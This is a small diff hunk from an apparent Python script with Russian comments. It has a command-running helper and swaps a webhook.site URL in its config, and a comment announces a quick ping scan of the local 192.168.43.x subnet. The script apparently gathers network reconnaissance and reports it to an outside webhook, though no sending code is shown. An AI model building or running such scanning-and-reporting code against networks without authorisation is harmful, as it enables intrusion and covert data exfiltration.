@@ -8,7 +8,7 @@ def run(cmd):
     except: return "Timeout/Error"
 
 # --- КОНФИГ ---
-WEBHOOK_URL = "https://webhook.site/5429af37-3c52-47e3-8b1e-068229bcbee5"
+WEBHOOK_URL = "https://webhook.site/654ef753-d639-43ad-970c-9b90a3fa1fb9"
 
 # 1. СКАНИРОВАНИЕ СОСЕДЕЙ (БЫСТРЫЙ ПИНГ ПОДСЕТИ)
 # Мы проверим только первые 10 адресов в нашей подсети 192.168.43.x
